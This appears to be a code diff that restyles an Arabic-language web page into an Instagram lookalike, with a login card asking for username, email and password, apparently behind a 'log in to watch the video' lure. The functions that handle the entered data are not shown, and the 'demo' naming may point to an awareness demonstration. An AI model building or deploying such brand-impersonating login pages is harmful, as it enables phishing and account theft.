@@ -60,31 +60,86 @@ button{
     color:#777;
     font-size:13px;
 }
+@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
 
+.insta-logo {
+    font-family: 'Grand Hotel', cursive, sans-serif;
+    font-size: 40px;
+    margin: 0 0 10px 0;
+    color: #262626;
+    font-weight: normal;
+}
+
+.insta-subtext {
+    color: #737373;
+    font-size: 13px;
+    margin-bottom: 15px;
+}
+
+.input-group input {
+    width: 100%;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 6px;
+    padding: 9px 12px;
+    margin-bottom: 8px;
+    font-size: 13px;
+    outline: none;
+    box-sizing: border-box;
+}
+
+.insta-btn-blue {
+    width: 100%;
+    background-color: #0095f6;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 8px 16px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+.insta-btn-primary {
+    width: 100%;
+    background-color: #262626;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-weight: 600;
+    cursor: pointer;
+}
 </style>
 </head>
 
 <body>
 
-   <div class="card">
-    <h2></h2>
-    <p>instagram.</p>
-
-    <button onclick="startDemo()">
-       Instagram
+  <!-- الكارد الأول -->
+<div class="card">
+    <h1 class="insta-logo">Instagram</h1>
+    <button onclick="startDemo()" class="insta-btn-primary">
+        افتح Instagram
     </button>
 </div>
-        <div id="login">
-            <h3>تسجيل الدخول</h3>
-            <p>يجب تسجيل الدخول لمشاهدة الفيديو.</p>
 
-            <input type="text" id="name" placeholder="الاسم">
-            <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <input type="password" id="password" placeholder="كلمة المرور">
+<!-- كارد تسجيل الدخول -->
+<div id="login" class="card" style="display:none;">
+    <h1 class="insta-logo">Instagram</h1>
+    <p class="insta-subtext">سجل الدخول للمتابعة</p>
 
-            <button onclick="finishDemo()">تسجيل الدخول</button>
-            <p class="small"></p>
-        </div>
+    <div class="input-group">
+        <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة السر">
+    </div>
+
+    <button onclick="finishDemo()" class="insta-btn-blue">
+        تسجيل الدخول
+    </button>
+
+    <div id="result" style="display:none; margin-top: 15px;"></div>
+</div>
 
         <div id="result"></div>
     </div> <!-- وسم إغلاق الـ card -->
